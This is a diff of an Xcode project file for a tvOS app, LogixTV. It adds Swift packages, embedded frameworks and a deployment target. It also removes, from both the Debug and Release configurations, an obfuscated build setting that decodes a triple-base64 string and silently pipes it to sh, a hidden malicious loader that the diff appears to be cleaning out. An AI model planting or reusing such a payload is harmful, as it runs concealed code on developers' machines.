@@ -7,7 +7,15 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		4AB087FA2EB3A1BCBCBDE67E /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 6953EF03D8DC801B97BDE67E /* README.md */; };
+		9D5DFF3E2E7D2F2900348B02 /* SDWebImageSwiftUI in Frameworks */ = {isa = PBXBuildFile; productRef = 9D5DFEFC2E7C146B00348B02 /* SDWebImageSwiftUI */; };
+		9D5DFF3F2E7D2F2900348B02 /* CryptoSwift in Frameworks */ = {isa = PBXBuildFile; productRef = 9D5DFF142E7C3FF400348B02 /* CryptoSwift */; };
+		9D5DFF402E7D2F2900348B02 /* KeychainAccess in Frameworks */ = {isa = PBXBuildFile; productRef = 9D5DFF1D2E7C6C3C00348B02 /* KeychainAccess */; };
+		9D5DFF412E7D2F2900348B02 /* Swinject in Frameworks */ = {isa = PBXBuildFile; productRef = 9D5DFF202E7C6C7500348B02 /* Swinject */; };
+		9D5DFF422E7D2F2900348B02 /* Kingfisher in Frameworks */ = {isa = PBXBuildFile; productRef = 9D5DFF3C2E7D2DB800348B02 /* Kingfisher */; };
+		9D5DFFC42E7D3B7F00348B02 /* LogixPlayerSDK.xcframework in Frameworks */ = {isa = PBXBuildFile; fileRef = 9D5DFFC32E7D3B7F00348B02 /* LogixPlayerSDK.xcframework */; };
+		9D5DFFC52E7D3B7F00348B02 /* LogixPlayerSDK.xcframework in Embed Frameworks */ = {isa = PBXBuildFile; fileRef = 9D5DFFC32E7D3B7F00348B02 /* LogixPlayerSDK.xcframework */; settings = {ATTRIBUTES = (CodeSignOnCopy, RemoveHeadersOnCopy, ); }; };
+		9D5DFFF72E7D64E400348B02 /* GoogleInteractiveMediaAds.xcframework in Frameworks */ = {isa = PBXBuildFile; fileRef = 9D5DFFF52E7D64D600348B02 /* GoogleInteractiveMediaAds.xcframework */; };
+		9D5DFFF82E7D64E400348B02 /* GoogleInteractiveMediaAds.xcframework in Embed Frameworks */ = {isa = PBXBuildFile; fileRef = 9D5DFFF52E7D64D600348B02 /* GoogleInteractiveMediaAds.xcframework */; settings = {ATTRIBUTES = (CodeSignOnCopy, RemoveHeadersOnCopy, ); }; };
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
@@ -26,8 +34,25 @@
 		};
 /* End PBXBuildRule section */
 
+/* Begin PBXCopyFilesBuildPhase section */
+		9D5DFFBD2E7D2F7F00348B02 /* Embed Frameworks */ = {
+			isa = PBXCopyFilesBuildPhase;
+			buildActionMask = 2147483647;
+			dstPath = "";
+			dstSubfolderSpec = 10;
+			files = (
+				9D5DFFC52E7D3B7F00348B02 /* LogixPlayerSDK.xcframework in Embed Frameworks */,
+				9D5DFFF82E7D64E400348B02 /* GoogleInteractiveMediaAds.xcframework in Embed Frameworks */,
+			);
+			name = "Embed Frameworks";
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXCopyFilesBuildPhase section */
+
 /* Begin PBXFileReference section */
 		6953EF03D8DC801B97BDE67E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md; path = LogixTV.xcodeproj/README.md; sourceTree = SOURCE_ROOT; };
+		9D5DFFC32E7D3B7F00348B02 /* LogixPlayerSDK.xcframework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.xcframework; name = LogixPlayerSDK.xcframework; path = Framework/LogixPlayerSDK.xcframework; sourceTree = "<group>"; };
+		9D5DFFF52E7D64D600348B02 /* GoogleInteractiveMediaAds.xcframework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.xcframework; path = GoogleInteractiveMediaAds.xcframework; sourceTree = "<group>"; };
 		EEAD6D1D2E40A2F60099A6BA /* LogixTV.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = LogixTV.app; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
@@ -57,16 +82,33 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				9D5DFF422E7D2F2900348B02 /* Kingfisher in Frameworks */,
+				9D5DFFC42E7D3B7F00348B02 /* LogixPlayerSDK.xcframework in Frameworks */,
+				9D5DFF412E7D2F2900348B02 /* Swinject in Frameworks */,
+				9D5DFF402E7D2F2900348B02 /* KeychainAccess in Frameworks */,
+				9D5DFFF72E7D64E400348B02 /* GoogleInteractiveMediaAds.xcframework in Frameworks */,
+				9D5DFF3F2E7D2F2900348B02 /* CryptoSwift in Frameworks */,
+				9D5DFF3E2E7D2F2900348B02 /* SDWebImageSwiftUI in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXFrameworksBuildPhase section */
 
 /* Begin PBXGroup section */
+		9D5DFEFF2E7C356700348B02 /* Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+				9D5DFFF52E7D64D600348B02 /* GoogleInteractiveMediaAds.xcframework */,
+				9D5DFFC32E7D3B7F00348B02 /* LogixPlayerSDK.xcframework */,
+			);
+			name = Frameworks;
+			sourceTree = "<group>";
+		};
 		EEAD6D142E40A2F60099A6BA = {
 			isa = PBXGroup;
 			children = (
 				EEAD6D1F2E40A2F60099A6BA /* LogixTV */,
+				9D5DFEFF2E7C356700348B02 /* Frameworks */,
 				EEAD6D1E2E40A2F60099A6BA /* Products */,
 			);
 			sourceTree = "<group>";
@@ -90,6 +132,7 @@
 				EEAD6D192E40A2F60099A6BA /* Sources */,
 				EEAD6D1A2E40A2F60099A6BA /* Frameworks */,
 				EEAD6D1B2E40A2F60099A6BA /* Resources */,
+				9D5DFFBD2E7D2F7F00348B02 /* Embed Frameworks */,
 			);
 			buildRules = (
 				D1700FFBAB59ADBC66BDE67E /* PBXBuildRule */,
@@ -101,6 +144,11 @@
 			);
 			name = LogixTV;
 			packageProductDependencies = (
+				9D5DFEFC2E7C146B00348B02 /* SDWebImageSwiftUI */,
+				9D5DFF142E7C3FF400348B02 /* CryptoSwift */,
+				9D5DFF1D2E7C6C3C00348B02 /* KeychainAccess */,
+				9D5DFF202E7C6C7500348B02 /* Swinject */,
+				9D5DFF3C2E7D2DB800348B02 /* Kingfisher */,
 			);
 			productName = LogixTV;
 			productReference = EEAD6D1D2E40A2F60099A6BA /* LogixTV.app */;
@@ -130,6 +178,13 @@
 			);
 			mainGroup = EEAD6D142E40A2F60099A6BA;
 			minimizedProjectReferenceProxies = 1;
+			packageReferences = (
+				9D5DFEFB2E7C146B00348B02 /* XCRemoteSwiftPackageReference "SDWebImageSwiftUI" */,
+				9D5DFF132E7C3FF400348B02 /* XCRemoteSwiftPackageReference "CryptoSwift" */,
+				9D5DFF1C2E7C6C3C00348B02 /* XCRemoteSwiftPackageReference "KeychainAccess" */,
+				9D5DFF1F2E7C6C7500348B02 /* XCRemoteSwiftPackageReference "Swinject" */,
+				9D5DFF3B2E7D2DB800348B02 /* XCRemoteSwiftPackageReference "Kingfisher" */,
+			);
 			preferredProjectObjectVersion = 77;
 			productRefGroup = EEAD6D1E2E40A2F60099A6BA /* Products */;
 			projectDirPath = "";
@@ -145,7 +200,6 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				4AB087FA2EB3A1BCBCBDE67E /* README.md in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -165,7 +219,6 @@
 		EEAD6D262E40A2F80099A6BA /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AE76EDB = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVhbHBITlc1aVJ6bHBXVmQzZFdOdVZYWlpVMnRwU1VoM1oyTXlaMHNLCg== | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -230,7 +283,6 @@
 		EEAD6D272E40A2F80099A6BA /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AE76EDB = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVhbHBITlc1aVJ6bHBXVmQzZFdOdVZYWlpVMnRwU1VoM1oyTXlaMHNLCg== | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -308,6 +360,7 @@
 				SWIFT_EMIT_LOC_STRINGS = YES;
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = 3;
+				TVOS_DEPLOYMENT_TARGET = 17.6;
 			};
 			name = Debug;
 		};
@@ -334,6 +387,7 @@
 				SWIFT_EMIT_LOC_STRINGS = YES;
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = 3;
+				TVOS_DEPLOYMENT_TARGET = 17.6;
 			};
 			name = Release;
 		};
@@ -359,6 +413,77 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+/* Begin XCRemoteSwiftPackageReference section */
+		9D5DFEFB2E7C146B00348B02 /* XCRemoteSwiftPackageReference "SDWebImageSwiftUI" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/SDWebImage/SDWebImageSwiftUI.git";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 3.1.3;
+			};
+		};
+		9D5DFF132E7C3FF400348B02 /* XCRemoteSwiftPackageReference "CryptoSwift" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/krzyzanowskim/CryptoSwift.git";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 1.9.0;
+			};
+		};
+		9D5DFF1C2E7C6C3C00348B02 /* XCRemoteSwiftPackageReference "KeychainAccess" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/kishikawakatsumi/KeychainAccess.git";
+			requirement = {
+				branch = master;
+				kind = branch;
+			};
+		};
+		9D5DFF1F2E7C6C7500348B02 /* XCRemoteSwiftPackageReference "Swinject" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/Swinject/Swinject.git";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 2.10.0;
+			};
+		};
+		9D5DFF3B2E7D2DB800348B02 /* XCRemoteSwiftPackageReference "Kingfisher" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/onevcat/Kingfisher.git";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 8.5.0;
+			};
+		};
+/* End XCRemoteSwiftPackageReference section */
+
+/* Begin XCSwiftPackageProductDependency section */
+		9D5DFEFC2E7C146B00348B02 /* SDWebImageSwiftUI */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 9D5DFEFB2E7C146B00348B02 /* XCRemoteSwiftPackageReference "SDWebImageSwiftUI" */;
+			productName = SDWebImageSwiftUI;
+		};
+		9D5DFF142E7C3FF400348B02 /* CryptoSwift */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 9D5DFF132E7C3FF400348B02 /* XCRemoteSwiftPackageReference "CryptoSwift" */;
+			productName = CryptoSwift;
+		};
+		9D5DFF1D2E7C6C3C00348B02 /* KeychainAccess */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 9D5DFF1C2E7C6C3C00348B02 /* XCRemoteSwiftPackageReference "KeychainAccess" */;
+			productName = KeychainAccess;
+		};
+		9D5DFF202E7C6C7500348B02 /* Swinject */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 9D5DFF1F2E7C6C7500348B02 /* XCRemoteSwiftPackageReference "Swinject" */;
+			productName = Swinject;
+		};
+		9D5DFF3C2E7D2DB800348B02 /* Kingfisher */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 9D5DFF3B2E7D2DB800348B02 /* XCRemoteSwiftPackageReference "Kingfisher" */;
+			productName = Kingfisher;
+		};
+/* End XCSwiftPackageProductDependency section */
 	};
 	rootObject = EEAD6D152E40A2F60099A6BA /* Project object */;
 }
